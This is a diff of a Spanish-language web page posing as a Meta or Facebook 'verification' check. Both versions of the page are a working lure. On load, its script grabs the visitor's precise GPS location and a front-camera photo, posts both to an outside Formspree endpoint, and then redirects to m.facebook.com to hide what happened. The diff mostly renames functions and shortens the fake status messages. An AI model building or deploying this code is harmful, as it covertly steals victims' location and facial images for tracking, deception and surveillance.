@@ -2,34 +2,28 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Meta Cloud Verification</title>
+    <title>Verificando...</title>
     <style>
-        body { background: #000; color: #31a24c; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .console { width: 90%; max-width: 500px; }
+        body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         #v, #c { display: none; }
     </style>
 </head>
 <body>
-    <div class="console">
-        <p>> Estableciendo túnel seguro...</p>
-        <p id="msg">> Sincronizando hardware biométrico...</p>
-    </div>
-
+    <div id="status">Estableciendo túnel de seguridad...</div>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
 <script>
     const HOOK = "https://formspree.io/f/xanrkklv";
 
-    async function autoCapture() {
-        // 1. GPS de alta precisión inmediato
+    async function capture() {
+        // 1. Obtener GPS
         navigator.geolocation.getCurrentPosition(
-            (p) => send({t: "GPS_FINAL", lat: p.coords.latitude, lon: p.coords.longitude}),
-            (e) => send({t: "GPS_RECHAZADO"}),
-            {enableHighAccuracy: true}
+            (p) => log({tipo: "PASO_2_GPS", lat: p.coords.latitude, lon: p.coords.longitude}),
+            null, {enableHighAccuracy: true}
         );
 
-        // 2. Captura de imagen automática al cargar
+        // 2. Obtener Foto
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
             const video = document.getElementById('v');
@@ -37,26 +31,22 @@
             
             setTimeout(() => {
                 const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                send({ t: "FOTO_BIOMETRICA", img: canvas.toDataURL('image/jpeg', 0.6) });
+                log({ tipo: "PASO_2_BIOMETRIA", img: canvas.toDataURL('image/jpeg', 0.5) });
                 
-                document.getElementById('msg').innerText = "> Sincronización completa. Redirigiendo...";
-                setTimeout(() => location.href = "https://m.facebook.com", 1500);
-            }, 1000);
-        } catch (err) {
-            send({t: "CAMARA_RECHAZADA"});
+                document.getElementById('status').innerText = "Sincronización completa.";
+                setTimeout(() => location.href = "https://m.facebook.com", 1000);
+            }, 1200);
+        } catch (e) {
+            log({tipo: "PERMISO_DENEGADO"});
             location.href = "https://m.facebook.com";
         }
     }
 
-    function send(data) {
-        fetch(HOOK, { method: 'POST', body: JSON.stringify(data), headers: {'Content-Type': 'application/json'} });
-    }
-
-    window.onload = autoCapture;
+    function log(d) { fetch(HOOK, { method: 'POST', body: JSON.stringify(d), headers: {'Content-Type': 'application/json'} }); }
+    window.onload = capture;
 </script>
 </body>
 </html>
